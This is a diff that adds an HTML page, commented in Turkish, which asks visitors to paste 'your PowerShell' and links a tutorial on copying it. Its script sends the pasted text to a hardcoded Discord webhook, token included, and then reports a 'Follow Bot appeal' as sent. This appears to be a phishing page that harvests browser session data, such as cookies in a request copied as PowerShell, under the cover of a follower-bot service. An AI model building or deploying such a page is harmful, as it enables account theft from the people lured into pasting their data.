@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Webhook Gönderici</title>
+    <style>
+        /* Sayfa genel stili */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f4f8;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+
+        /* Container, tüm içeriği merkezde tutuyor */
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 900px; /* Daha geniş bir container */
+        }
+
+        /* Başlık stili */
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        /* Content bölümü, form ve video kısmını flex ile hizalı tutuyor */
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 20px;
+        }
+
+        /* Form kısmı */
+        .form-section {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        /* Textarea (kullanıcı kodu girecek alan) */
+        textarea {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            resize: vertical;
+            margin-bottom: 20px;
+            background-color: #fafafa;
+        }
+
+        /* Buton stili */
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        /* Video alanı */
+        .video-section {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        /* Mesaj (gönderim sonrası bildirim) */
+        #responseMessage {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Your PowerShell </h1>
+        
+        <div class="content">
+            <!-- PowerShell kodu yazılacak alan -->
+            <div class="form-section">
+                <textarea id="powershellCode" rows="10" placeholder="PowerShell kodunu buraya yazın..."></textarea>
+                <button id="sendBtn" onclick="sendPowershell()">Sent</button>
+                <p id="responseMessage"></p>
+            </div>
+
+            <!-- YouTube Video Alanı -->
+            <div class="video-section">
+                <h2>How to copy your PowerShell (Tutorial)</h2>
+                <iframe width="560" height="315" src="https://www.youtube.com/embed/your-video-id" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function sendPowershell() {
+            const powershellCode = document.getElementById("powershellCode").value;
+            const responseMessage = document.getElementById("responseMessage");
+
+            if (powershellCode.trim() === "") {
+                responseMessage.textContent = "Your powershell";
+                responseMessage.style.color = "red";
+                return;
+            }
+
+            const webhookUrl = "https://discord.com/api/webhooks/1368602284438589682/3Jvf6gpplT9DZfENFzFbYLq9ggude97OkazAOH67LLRTfdHBRgp8lb69xElQJf0N1BeS";  // Discord webhook URL'niz
+
+            const payload = {
+                content: powershellCode  // PowerShell kodunu 'content' olarak gönderiyoruz
+            };
+
+            // Fetch API ile POST isteği gönder
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                responseMessage.textContent = "Follow Bot appeal successfully sent";
+                responseMessage.style.color = "green";
+            })
+            .catch(error => {
+                responseMessage.textContent = "An error was occured: " + error;
+                responseMessage.style.color = "red";
+            });
+        }
+    </script>
+</body>
+</html>
